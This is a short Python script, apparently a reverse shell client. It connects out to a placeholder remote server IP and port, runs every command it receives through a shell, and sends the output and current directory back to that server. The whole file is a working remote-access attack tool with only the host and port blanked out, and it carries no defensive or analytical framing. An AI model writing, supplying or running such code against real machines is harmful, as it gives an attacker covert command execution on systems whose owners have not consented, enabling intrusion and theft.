import socket
import os
import subprocess

s=socket.socket()

host='x.x.x.x'#cloud server IP
port=xxxx #port number

s.connect((host,port))

while True:
    data=s.recv(1024)
    if data[:2].decode("utf-8")=='cd':
        os.chdir(data[3:].decode("utf-8"))
    if len(data)>0:
        #open a terminal using Popen, get access shell, save input and output of commands and errors
        cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
        output_byte=cmd.stdout.read()+cmd.stderr.read()
        output_str=str(output_byte,"utf-8")

        #get the current working directory
        currentWD=os.getcwd()+">"

        #send the output back to our server and the working directory
        s.send(str.encode(output_str+currentWD))
        #in case we want to show the output to the client
        #print(output_str)
